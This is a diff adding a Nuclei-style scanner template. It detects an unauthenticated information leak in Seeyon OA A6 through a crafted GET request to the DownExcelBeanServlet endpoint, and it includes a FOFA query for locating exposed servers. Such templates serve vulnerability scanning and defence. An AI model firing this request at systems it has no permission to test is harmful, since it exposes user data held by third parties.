@@ -1,0 +1,28 @@
+id: seeyon-oa-a6-downexcelbeanservlet-info-leak
+
+info:
+  name: Seeyon OA A6 DownExcelBeanServlet Info Leak
+  author: zp857
+  severity: info
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,leak
+  metadata:
+    fofa-query: 'body="致远协创A6"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "attachment"
+          - "application/x-msdownload"
+        part: header
+        condition: and
+
+      - type: status
+        status:
+          - 200
